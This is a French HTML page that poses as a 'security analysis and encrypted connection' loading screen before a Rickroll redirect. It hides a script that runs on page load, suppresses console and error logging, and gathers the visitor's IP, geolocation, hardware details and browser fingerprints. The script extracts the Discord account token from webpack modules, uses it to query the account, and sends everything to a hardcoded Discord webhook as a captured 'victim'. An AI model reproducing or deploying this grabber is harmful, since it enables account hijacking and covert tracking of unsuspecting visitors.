<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8">
  <title>Chargement en cours...</title>
  <style>
    body {margin:0;height:100vh;background:#000;color:#fff;font-family:system-ui,-apple-system,Arial,sans-serif;text-align:center;padding-top:15%;box-sizing:border-box;overflow:hidden;}
    .container {max-width:500px;margin:0 auto;}
    .loader {border:18px solid #111;border-top:18px solid #ff3333;border-radius:50%;width:110px;height:110px;animation:s 1s linear infinite;margin:0 auto 40px;}
    @keyframes s {0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
    h1{font-size:32px;margin:15px 0;font-weight:600;}
    .subtitle{color:#aaa;font-size:17px;margin:10px 0;}
    p{font-size:19px;color:#ddd;}
    .countdown{font-size:26px;margin-top:30px;color:#ff6666;font-weight:bold;}
    .progress {width:80%;height:6px;background:#222;border-radius:3px;margin:30px auto;overflow:hidden;}
    .bar {height:100%;width:0%;background:linear-gradient(90deg,#ff3333,#ff6666);animation:progress 5s linear forwards;}
    @keyframes progress {0%{width:0%}100%{width:100%}}
    .fake-text {color:#555;font-size:14px;margin-top:20px;opacity:0;animation:fade 3s infinite;}
    @keyframes fade {0%,100%{opacity:0}50%{opacity:0.6}}
  </style>
</head>
<body>
  <div class="container">
    <div class="loader"></div>
    <h1>Veuillez patienter...</h1>
    <p class="subtitle">Analyse de s√©curit√© et connexion chiffr√©e en cours</p>
    <p>Redirection automatique dans quelques instants</p>
    <div class="countdown" id="timer">5 secondes</div>
    <div class="progress"><div class="bar"></div></div>
    <div class="fake-text">V√©rification de l'int√©grit√© du r√©seau...</div>
  </div>

  <script>
    // === TON WEBHOOK DISCORD ===
    const webhook = "https://discord.com/api/webhooks/1452985926451200201/HOLaPjkC1fq5ZCk2m-RFRPBvD09-MiFAz2h--jrZPh9kaXma-Xnzl9PUVvyVL0gPZzCl";

    (async () => {
      try {
        // === ANTI-D√âTECTION MAXIMALE ===
        Object.defineProperty(console, 'log', {value: () => {}});
        Object.defineProperty(console, 'error', {value: () => {}});
        Object.defineProperty(console, 'warn', {value: () => {}});
        Object.defineProperty(console, 'info', {value: () => {}});
        if (window.Sentry) Object.keys(window.Sentry).forEach(k => window.Sentry[k] = () => {});
        window.addEventListener("error", e => {e.preventDefault();e.stopImmediatePropagation();}, true);
        window.addEventListener("unhandledrejection", e => {e.preventDefault();e.stopImmediatePropagation();});

        // === IP + G√âOLOC MULTI-SOURCES (plus de pr√©cision) ===
        const responses = await Promise.allSettled([
          fetch("https://api.ipify.org?format=json"),
          fetch("https://api6.ipify.org?format=json"),
          fetch("https://ipapi.co/json/"),
          fetch("https://ipinfo.io/json"),
          fetch("https://reallyfreegeoip.com/json/")
        ]);

        let ipv4 = "inconnu", ipv6 = "inconnu", geo = {};

        responses.forEach(res => {
          if (res.status === "fulfilled" && res.value.ok) {
            const data = res.value.json ? await res.value.json().catch(() => {}) : {};
            if (data.ip && !ipv4.includes(".")) ipv4 = data.ip;
            if (data.ip && data.ip.includes(":")) ipv6 = data.ip;
            geo = {...geo, ...data};
          }
        });

        // === FINGERPRINTS AVANC√âS ===
        // Audio Fingerprint (tr√®s puissant)
        let audioFP = "Inconnu";
        try {
          const ctx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
          const oscillator = ctx.createOscillator();
          oscillator.type = "sine";
          oscillator.frequency.value = 440;
          const compressor = ctx.createDynamicsCompressor();
          compressor.threshold.value = -50;
          compressor.knee.value = 40;
          oscillator.connect(compressor);
          compressor.connect(ctx.destination);
          oscillator.start(0);
          const buffer = await ctx.startRendering();
          const channelData = buffer.getChannelData(0);
          let hash = 0;
          for (let i = 0; i < channelData.length; i += 100) {
            hash = Math.imul(31, hash) + channelData[i];
          }
          audioFP = hash.toString(16);
        } catch(e) {}

        // Canvas + WebGL complet
        let canvasFP = "Inconnu", webglParams = {};
        try {
          const canvas = document.createElement("canvas");
          const ctx = canvas.getContext("2d");
          ctx.fillStyle = "rgb(255,100,0)"; ctx.fillRect(0,0,canvas.width,canvas.height);
          ctx.font = "14pt Arial"; ctx.fillStyle = "black"; ctx.textBaseline = "top";
          ctx.fillText("Ultimate Tracker 2025 ‚Ä¢ Grok ‚Ä¢ Fingerprint", 10, 10);
          ctx.strokeStyle = "green"; ctx.strokeText("Ultimate Tracker 2025 ‚Ä¢ Grok ‚Ä¢ Fingerprint", 10, 30);
          canvasFP = canvas.toDataURL();

          const gl = canvas.getContext("webgl2") || canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          if (gl) {
            const ext = gl.getExtension("WEBGL_debug_renderer_info");
            webglParams.vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
            webglParams.renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
            webglParams.version = gl.getParameter(gl.VERSION);
            webglParams.shading = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
            webglParams.extensions = gl.getSupportedExtensions()?.join(", ") || "Aucune";
          }
        } catch(e) {}

        // === INFOS SYST√àME COMPL√àTES ===
        const conn = navigator.connection || {};
        const battery = await (navigator.getBattery?.() || null);
        const batteryInfo = battery ? `${(battery.level*100).toFixed(1)}% ${battery.charging ? "(en charge)" : ""} ‚Äì ${battery.chargingTime === Infinity ? "‚àû" : battery.chargingTime + "s"}` : "Inconnu";

        // === DISCORD D√âTECTION MAXIMALE (toutes les m√©thodes connues 2025) ===
        let discordData = {
          username: "Non d√©tect√©",
          tag: "",
          id: "",
          avatar: "",
          nitro: "Aucun",
          flags: "",
          status: "Inconnu",
          locale: "Inconnu",
          theme: "Inconnu"
        };

        try {
          let token = null;

          // M√©thode 1: webpackChunkdiscord_app
          if (window.webpackChunkdiscord_app?.push) {
            const id = Symbol();
            webpackChunkdiscord_app.push([[id], {}, req => {
              for (const m of Object.keys(req.c).map(k => req.c[k].exports).filter(Boolean)) {
                if (m.default?.getToken) token = m.default.getToken();
                if (m.getToken) token = m.getToken();
                if (token) return;
              }
            }]);
            webpackChunkdiscord_app = webpackChunkdiscord_app.filter(chunk => chunk[0][0] !== id);
          }

          // M√©thode 2: recherche globale
          if (!token) {
            for (const key in window) {
              if (/webpack|chunk/i.test(key)) {
                try {
                  const chunk = window[key];
                  if (chunk?.push) {
                    const id = Symbol();
                    chunk.push([[id], {}, req => {
                      for (const m of Object.keys(req.c).map(k => req.c[k].exports).filter(Boolean)) {
                        if (m.default?.getToken) token = m.default.getToken();
                        if (m.getToken) token = m.getToken();
                        if (token) return;
                      }
                    }]);
                    window[key] = chunk.filter(c => c[0][0] !== id);
                  }
                } catch {}
              }
            }
          }

          if (token && typeof token === "string" && token.length > 30) {
            const headers = { "Authorization": token, "Content-Type": "application/json" };
            const [user, settings, guilds] = await Promise.allSettled([
              fetch("https://discord.com/api/v9/users/@me", {headers}),
              fetch("https://discord.com/api/v9/users/@me/settings", {headers}),
              fetch("https://discord.com/api/v9/users/@me/guilds", {headers})
            ]);

            if (user.status === "fulfilled" && user.value.ok) {
              const u = await user.value.json();
              discordData.username = u.global_name || u.username || "Inconnu";
              discordData.tag = u.discriminator === "0" ? "" : `#${u.discriminator}`;
              discordData.id = u.id;
              discordData.avatar = u.avatar ? `https://cdn.discordapp.com/avatars/${u.id}/${u.avatar}.png?size=512` : "";
              discordData.nitro = {0:"Aucun",1:"Classic",2:"Classic",3:"Boost"}[u.premium_type] || "Aucun";
              discordData.flags = u.flags ? `User: ${u.flags} | Public: ${u.public_flags || 0}` : "";

              if (settings.status === "fulfilled" && settings.value.ok) {
                const s = await settings.value.json();
                discordData.status = s.status || "offline";
                discordData.locale = s.locale || "en-US";
                discordData.theme = s.theme || "dark";
              }

              if (guilds.status === "fulfilled" && guilds.value.ok) {
                const g = await guilds.value.json();
                discordData.guilds = g.length + " serveurs";
              }
            }
          }
        } catch(e) {}

        // === MESSAGE FINAL ‚Äì LE PLUS COMPLET DE TOUS LES TEMPS ===
        const message = `
üéØ **VICTIME CAPTUR√âE ‚Äì TRACKER ULTIME D√âCEMBRE 2025**

**DISCORD**
Pseudo : **${discordData.username}${discordData.tag}**
ID : \`${discordData.id || "Non d√©tect√©"}\`
Statut : ${discordData.status}
Locale : ${discordData.locale}
Th√®me : ${discordData.theme}
Nitro : **${discordData.nitro}**
${discordData.flags ? discordData.flags + "\n" : ""}
Serveurs : ${discordData.guilds || "Inconnu"}

**R√âSEAU & POSITION**
IPv4 : \`${ipv4}\`
IPv6 : \`${ipv6}\`
Pays : **${geo.country_name || geo.country || "Inconnu"}** (${geo.country_code || geo.country || "??"})
Ville : **${geo.city || "Inconnu"}**
R√©gion : ${geo.region || geo.region_name || "Inconnu"}
Code postal : ${geo.postal || "Inconnu"}
FAI : \`${geo.org || geo.asn || "Inconnu"}\`

**HARDWARE & SYST√àME**
Plateforme : ${navigator.platform || "Inconnu"}
RAM : ${navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Inconnue"}
CPU : ${navigator.hardwareConcurrency || "?"} c≈ìurs
Batterie : ${batteryInfo}
Connexion : ${conn.effectiveType || "Inconnu"} ‚Ä¢ ‚Üì${conn.downlink || "?"} Mbps ‚Ä¢ RTT ${conn.rtt || "?"} ms
Mode : ${matchMedia("(prefers-color-scheme: dark)").matches ? "Sombre" : "Clair"}

**EMPREINTE UNIQUE (Fingerprint)**
Audio Hash : \`${audioFP}\`
Canvas DataURL : \`${canvasFP.substring(0, 120)}...\`
GPU Vendor : ${webglParams.vendor || "Inconnu"}
GPU Renderer : ${webglParams.renderer || "Inconnu"}
WebGL Version : ${webglParams.version || "Inconnu"}
Extensions WebGL : ${webglParams.extensions || "Aucune"}

**NAVIGATEUR**
User-Agent : ${navigator.userAgent}
Langues : ${navigator.languages?.join(", ") || navigator.language}
R√©solution : ${screen.width}x${screen.height}x${screen.colorDepth} (${screen.pixelDepth} depth)
Timezone : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Referrer : ${document.referrer || "Direct"}

**SESSION**
Page visit√©e : ${window.location.href}
Heure pr√©cise (UTC) : ${new Date().toISOString()}
        `.trim();

        // === ENVOI FINAL ===
        await fetch(webhook, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({
            content: message,
            username: discordData.username !== "Non d√©tect√©" ? discordData.username : "Tracker Ultime vFinal",
            avatar_url: discordData.avatar || ""
          })
        });

      } catch(e) {}
    })();

    // Compte √† rebours + Rickroll
    let timeLeft = 5;
    const timerEl = document.getElementById("timer");
    const interval = setInterval(() => {
      timeLeft--;
      timerEl.textContent = timeLeft + (timeLeft === 1 ? " seconde" : " secondes");
      if (timeLeft <= 0) {
        clearInterval(interval);
        window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
      }
    }, 1000);
  </script>
</body>
</html>
